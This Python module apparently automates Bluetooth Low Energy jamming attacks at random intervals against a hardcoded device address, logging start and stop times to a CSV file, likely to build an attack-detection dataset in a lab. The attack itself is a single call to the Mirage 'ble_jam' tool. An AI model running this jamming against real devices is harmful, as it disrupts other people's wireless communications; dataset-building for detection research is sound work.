"""
	Module to help script attacks for BTLE
"""

import subprocess
import signal
import threading
import serial
import time
import csv
from random import randint

start_time = 0.0
current_time = 0.0

init = True

active = False

sleep_val = 5

attack_log = []

attack_type = ""

header = ["Time", "Info", "Status"]

# Sets time so attacks can be flagged
def set_time(t):
	global start_time
	global current_time
	if start_time == 0.0:
		start_time = t
	else:
		current_time = round(t - start_time, 6)
	#print(current_time)


''' Write the dataset to a csv output file '''
def write_to_csv():
	try:
		print("Writing to CSV file...")
		with open('out.csv', 'w') as csv_file:
			writer = csv.DictWriter(csv_file, fieldnames = header)
			writer.writeheader()
			for data in attack_log:
				writer.writerow(data)
	except Exception as e:
		print("write_to_csv error")
		print(e)
		

# Reset the microbit with an Arduino
def trig_reset():
	print("Resetting microbit")
	arduino = serial.Serial(port='/dev/ttyACM1', baudrate=115200, timeout=0.25)
	time.sleep(2)
	arduino.write("RESET ".encode())
	arduino.close()
	
	
# Non-Blocking Sleep
def non_block_sleep():
	global active
	global sleep_val
	global init
	for i in reversed(range(sleep_val)):
		if not init and i < 5:
			print("Attack in " + str(i+1))
		time.sleep(1)
		if active == False:
			break
	
# Randomize attacks and log start and stop times
def attack_randomizer():
	global active
	global attack_log
	global sleep_val
	global init
	init_sleep = threading.Thread(target=non_block_sleep)
	init_sleep.start()
	init_sleep.join()
	init = False
	while active:
		sleep_val = randint(10, 300)
		print("Next Attack in " + str(sleep_val) + " Seconds")
		th_sleep = threading.Thread(target=non_block_sleep)
		th_sleep.start()
		th_sleep.join()
		if active:
			print("Starting Attack")
			t_out = randint(3, 30)
			start_data = {"Time": current_time, "Info": "Attack", "Status": 1}
			attack_log.append(start_data)
			# Start the attack
			try:
				subprocess.run(['mirage', 'ble_jam', 'TARGET=08:3a:f2:51:17:22'], timeout=t_out)
			except Exception:
				pass
			stop_data = {"Time": current_time, "Info": "Attack", "Status": 0}
			attack_log.append(stop_data)
			time.sleep(1)
		print("Attack finished")
		trig_reset()
	end_data = {"Time": current_time, "Info": "Log", "Status": 0}
	attack_log.append(end_data)
	write_to_csv()
		
		
# Initialize attack helper
def init_attack(t):
	global active
	global attack_type
	global attack_log
	active = True
	attack_type = t
	
	data = {"Time": current_time, "Info": "Log", "Status": 1}
	attack_log.append(data)
	
	th_attack = threading.Thread(target=attack_randomizer)
	th_attack.start()
